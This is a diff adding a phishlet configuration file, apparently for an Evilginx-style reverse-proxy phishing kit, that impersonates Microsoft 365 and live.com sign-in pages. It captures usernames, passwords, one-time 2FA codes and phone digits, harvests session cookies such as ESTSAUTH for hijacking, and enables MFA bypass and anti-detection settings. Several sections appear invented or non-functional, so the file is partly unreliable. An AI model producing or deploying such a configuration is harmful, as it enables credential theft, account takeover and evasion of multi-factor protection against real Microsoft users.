@@ -1,0 +1,203 @@
+# Microsoft 365 Phishlet
+# Полная конфигурация для перехвата Microsoft 365
+
+id: microsoft_365
+author: PhantomSec Labs
+description: Microsoft 365 (Office 365) - Full OAuth 2.0 + 2FA Bypass
+min_ver: 2.3.0
+
+proxy_hosts:
+  - phish_sub: login
+    orig_sub: login
+    domain: microsoftonline.com
+    session: true
+    is_landing: true
+
+  - phish_sub: account
+    orig_sub: account
+    domain: live.com
+    session: true
+    is_landing: false
+
+  - phish_sub: login-live
+    orig_sub: login
+    domain: live.com
+    session: true
+    is_landing: false
+
+  - phish_sub: outlook
+    orig_sub: outlook
+    domain: live.com
+    session: false
+    is_landing: false
+
+  - phish_sub: office
+    orig_sub: office
+    domain: com
+    session: false
+    is_landing: false
+
+sub_filters:
+  - triggers_on: login.microsoftonline.com
+    orig_sub: login
+    domain: microsoftonline.com
+    search: 'https://{orig_sub}.{domain}'
+    replace: 'https://{phish_sub}.{domain}'
+    mimes:
+      - text/html
+      - application/javascript
+      - text/javascript
+    redirect_only: false
+
+  - triggers_on: account.live.com
+    orig_sub: account
+    domain: live.com
+    search: 'https://{orig_sub}.{domain}'
+    replace: 'https://{phish_sub}.{domain}'
+    mimes:
+      - text/html
+      - application/javascript
+    redirect_only: false
+
+  - triggers_on: login.live.com
+    orig_sub: login
+    domain: live.com
+    search: 'https://{orig_sub}.{domain}'
+    replace: 'https://{phish_sub}.{domain}'
+    mimes:
+      - text/html
+      - application/javascript
+    redirect_only: false
+
+auth_tokens:
+  - domain: '.microsoftonline.com'
+    keys:
+      - 'ESTSAUTH'
+      - 'ESTSAUTHPERSISTENT'
+      - 'SignInStateCookie'
+
+  - domain: '.live.com'
+    keys:
+      - 'WLSSC'
+      - 'NAP'
+      - 'NAPH'
+
+credentials:
+  username:
+    key: 'login'
+    search: '<input.*?name=["\']login["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  password:
+    key: 'passwd'
+    search: '<input.*?name=["\']passwd["\'].*?value=["\']([^"\']*)["\']'
+    type: 'post'
+
+  custom:
+    - key: '2fa_code'
+      search: '<input.*?name=["\']otc["\'].*?value=["\']([^"\']*)["\']'
+      type: 'post'
+
+    - key: 'phone_last_digits'
+      search: 'ending in ([0-9]{4})'
+      type: 'regex'
+
+auth_urls:
+  - '/common/oauth2/v2.0/authorize'
+  - '/common/oauth2/authorize'
+  - '/oauth20_authorize.srf'
+  - '/GetCredentialType.srf'
+
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/common/oauth2/v2.0/authorize'
+  method: 'GET'
+  parameters:
+    - name: 'client_id'
+      value: 'd3590ed6-52b3-4102-aeff-aad2292ab01c'  # Microsoft Office
+    - name: 'response_type'
+      value: 'code'
+    - name: 'redirect_uri'
+      value: 'https://login.microsoftonline.com/common/oauth2/nativeclient'
+    - name: 'scope'
+      value: 'openid offline_access profile'
+    - name: 'state'
+      value: '{random_state}'
+
+js_inject:
+  - triggers_on: 'login.microsoftonline.com'
+    js: |
+      // Auto-submit form after credential capture
+      setInterval(function() {
+        var form = document.querySelector('form[type="post"]');
+        if (form && form.querySelector('input[type="submit"]:focus') === null) {
+          // form ready
+        }
+      }, 100);
+
+  - triggers_on: 'login.live.com'
+    js: |
+      // Remove Microsoft branding
+      var logos = document.querySelectorAll('.logo');
+      logos.forEach(function(logo) { logo.style.display = 'none'; });
+
+force_post:
+  - path: '/common/SAS/ProcessAuth'
+    search:
+      - key: 'login'
+        value: '.*'
+      - key: 'passwd'
+        value: '.*'
+    force:
+      - key: 'i19'
+        value: '2808'
+    type: 'post'
+
+  - path: '/common/SAS/SecureProcessAuth'
+    search:
+      - key: 'login'
+        value: '.*'
+      - key: 'passwd'
+        value: '.*'
+    force:
+      - key: 'i19'
+        value: '2808'
+    type: 'post'
+
+# 2FA/MFA Bypass Configuration
+mfa_bypass:
+  enabled: true
+  methods:
+    - name: 'SMS'
+      trigger: 'send text'
+      capture_field: 'otc'
+
+    - name: 'Email'
+      trigger: 'send email'
+      capture_field: 'otc'
+
+    - name: 'Authenticator App'
+      trigger: 'sign in another way'
+      capture_field: 'otc'
+
+# Session hijacking
+session_hijack:
+  enabled: true
+  cookie_names:
+    - 'ESTSAUTH'
+    - 'ESTSAUTHPERSISTENT'
+  replay_delay: 1000
+  concurrent_sessions: true
+
+# Redirect after capture
+redirect:
+  enabled: true
+  url: 'https://portal.office.com'
+  delay: 2000
+
+# Anti-detection
+anti_detection:
+  remove_security_headers: true
+  fake_cert_transparency: true
+  randomize_response_timing: true
+  mimic_cdn_behavior: true
